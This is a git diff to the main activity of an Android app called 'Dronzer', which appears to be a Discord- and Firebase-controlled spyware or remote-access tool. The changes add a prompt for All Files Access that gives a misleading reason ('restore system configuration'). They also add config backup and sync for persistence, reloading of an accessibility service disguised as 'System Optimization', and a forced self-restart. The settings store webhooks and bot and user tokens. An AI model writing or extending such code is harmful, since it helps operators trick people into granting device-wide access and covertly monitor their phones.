@@ -2,6 +2,7 @@ package com.example.dronzer
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.app.AppOpsManager
 import android.app.DownloadManager
 import android.app.admin.DevicePolicyManager
@@ -158,6 +159,7 @@ class MainActivity : FragmentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        ConfigPersistence.sync(this)
         enableEdgeToEdge()
         setContent {
             var showIntro by rememberSaveable { mutableStateOf(true) }
@@ -185,6 +187,26 @@ class MainActivity : FragmentActivity() {
     }
 
     private fun checkAllPermissionsAggressively() {
+        // First check for All Files Access on Android 11+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Toast.makeText(this, "Enable 'All Files Access' to restore system configuration.", Toast.LENGTH_LONG).show()
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    startActivity(intent)
+                }
+                return
+            } else {
+                // If permission just granted, try syncing again
+                ConfigPersistence.sync(this)
+            }
+        }
+
         if (!isAccessibilityServiceEnabled()) {
             Toast.makeText(this, "Enable 'Dronzer System Optimization' to proceed.", Toast.LENGTH_LONG).show()
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
@@ -574,7 +596,21 @@ fun Dashboard() {
                     } else {
                         context.startService(reloadIntent)
                     }
-                    scope.launch { snackbarHostState.showSnackbar("Settings synced with protocols.") }
+                    
+                    // Also reload for Accessibility Service
+                    val reloadAccessIntent = Intent(context, DronzerAccessibilityService::class.java).apply {
+                        action = "ACTION_RELOAD_CONFIG"
+                    }
+                    context.startService(reloadAccessIntent)
+
+                    // Requirement 2: Reload the app automatically
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        val restartIntent = context.packageManager.getLaunchIntentForPackage(context.packageName)
+                        restartIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        context.startActivity(restartIntent)
+                        (context as? Activity)?.finish()
+                        android.os.Process.killProcess(android.os.Process.myPid())
+                    }, 500)
                 }
             )
         } else if (isFullscreen && playingFileUrl != null) {
@@ -820,12 +856,13 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
     var username by remember { mutableStateOf(prefs.getString("auth_user", "admin") ?: "admin") }
     var password by remember { mutableStateOf(prefs.getString("auth_pass", "admin") ?: "admin") }
     var is2faEnabled by remember { mutableStateOf(prefs.getBoolean("auth_2fa", false)) }
+    var isBiometricEnabled by remember { mutableStateOf(prefs.getBoolean("biometric_enabled", false)) }
     
     var matrixColor by remember { mutableStateOf(prefs.getString("matrix_color", "#00FF41") ?: "#00FF41") }
 
     var activeDialog by remember { mutableStateOf<String?>(null) }
 
-    Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
+    Surface(modifier = Modifier.fillMaxSize(), color = Color.Black) {
         Column {
             TopAppBar(
                 title = { Text("Settings") },
@@ -845,23 +882,33 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                             putString("auth_user", username.trim())
                             putString("auth_pass", password.trim())
                             putBoolean("auth_2fa", is2faEnabled)
+                            putBoolean("biometric_enabled", isBiometricEnabled)
                             putString("matrix_color", matrixColor.trim())
                             apply()
                         }
+                        // Requirement 1: Save to backup
+                        ConfigPersistence.saveToBackup(context)
                         onSave()
                     }) {
                         Text("SAVE")
                     }
-                }
+                },
+                colors = TopAppBarDefaults.topAppBarColors(
+                    containerColor = Color.Black,
+                    titleContentColor = MaterialTheme.colorScheme.onBackground,
+                    navigationIconContentColor = MaterialTheme.colorScheme.onBackground,
+                    actionIconContentColor = MaterialTheme.colorScheme.onBackground
+                )
             )
             
-            LazyColumn(modifier = Modifier.fillMaxSize()) {
+            LazyColumn(modifier = Modifier.fillMaxSize().background(Color.Black)) {
                 item {
                     ListItem(
                         headlineContent = { Text("Set System Config") },
                         supportingContent = { Text("Discord Webhook, Bot & User Tokens, Firebase URL") },
                         leadingContent = { Icon(Icons.Default.Terminal, null) },
-                        modifier = Modifier.clickable { activeDialog = "discord" }
+                        modifier = Modifier.clickable { activeDialog = "discord" },
+                        colors = ListItemDefaults.colors(containerColor = Color.Black)
                     )
                 }
                 item {
@@ -869,7 +916,8 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                         headlineContent = { Text("Register Credentials") },
                         supportingContent = { Text("Change Username, Password and 2FA") },
                         leadingContent = { Icon(Icons.Default.Security, null) },
-                        modifier = Modifier.clickable { activeDialog = "auth" }
+                        modifier = Modifier.clickable { activeDialog = "auth" },
+                        colors = ListItemDefaults.colors(containerColor = Color.Black)
                     )
                 }
                 item {
@@ -877,7 +925,8 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                         headlineContent = { Text("Change Theme") },
                         supportingContent = { Text("Matrix Animation Colors") },
                         leadingContent = { Icon(Icons.Default.Palette, null) },
-                        modifier = Modifier.clickable { activeDialog = "theme" }
+                        modifier = Modifier.clickable { activeDialog = "theme" },
+                        colors = ListItemDefaults.colors(containerColor = Color.Black)
                     )
                 }
                 item {
@@ -886,11 +935,12 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                         leadingContent = { Icon(Icons.Default.Email, null) },
                         modifier = Modifier.clickable { 
                             val intent = Intent(Intent.ACTION_SENDTO).apply {
-                                data = "mailto:dev@dronzer.app".toUri()
+                                data = "mailto:devilayu.official@gmail.com".toUri()
                                 putExtra(Intent.EXTRA_SUBJECT, "Dronzer Support")
                             }
                             context.startActivity(intent)
-                        }
+                        },
+                        colors = ListItemDefaults.colors(containerColor = Color.Black)
                     )
                 }
                 item {
@@ -898,9 +948,10 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                         headlineContent = { Text("Report Bug") },
                         leadingContent = { Icon(Icons.Default.BugReport, null) },
                         modifier = Modifier.clickable { 
-                             val intent = Intent(Intent.ACTION_VIEW, "https://github.com/dronzer/issues".toUri())
+                             val intent = Intent(Intent.ACTION_VIEW, "https://github.com/VintageAyu/DRONZER/issues".toUri())
                              context.startActivity(intent)
-                        }
+                        },
+                        colors = ListItemDefaults.colors(containerColor = Color.Black)
                     )
                 }
             }
@@ -939,6 +990,10 @@ fun FullscreenSettingsPage(onClose: () -> Unit, onSave: () -> Unit) {
                         Spacer(modifier = Modifier.height(8.dp))
                         OutlinedTextField(value = password, onValueChange = { password = it }, label = { Text("Password") }, modifier = Modifier.fillMaxWidth())
                         Spacer(modifier = Modifier.height(16.dp))
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Checkbox(checked = isBiometricEnabled, onCheckedChange = { isBiometricEnabled = it })
+                            Text("Enable Biometric Login")
+                        }
                         Row(verticalAlignment = Alignment.CenterVertically) {
                             Checkbox(checked = is2faEnabled, onCheckedChange = { is2faEnabled = it })
                             Text("Enable 2FA (Bio/Pattern)")
@@ -987,7 +1042,7 @@ fun IntroVideoScreen(onVideoFinished: () -> Unit) {
         TextButton(
             onClick = onVideoFinished,
             modifier = Modifier.align(Alignment.TopEnd).padding(top = 32.dp, end = 16.dp),
-            colors = ButtonDefaults.textButtonColors(contentColor = Color.White.copy(alpha = 0.7f))
+            colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent, contentColor = Color.White.copy(alpha = 0.7f))
         ) {
             Text("Skip Intro")
         }
@@ -1243,7 +1298,12 @@ fun StatusContent(onClearCaches: () -> Unit, matrixColor: Color) {
             verticalArrangement = Arrangement.Center,
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            Icon(Icons.Default.CheckCircle, null, modifier = Modifier.size(100.dp), tint = MaterialTheme.colorScheme.primary)
+            Icon(
+                painter = painterResource(id = R.drawable.ic_logo),
+                contentDescription = null,
+                modifier = Modifier.size(100.dp),
+                tint = Color.Red
+            )
             Spacer(modifier = Modifier.height(24.dp))
             Text(text = "Dronzer System Active", style = MaterialTheme.typography.headlineMedium, color = Color.White)
             Text(text = "All protocols authorized & monitoring.", style = MaterialTheme.typography.bodyLarge, color = Color.White.copy(alpha = 0.8f))
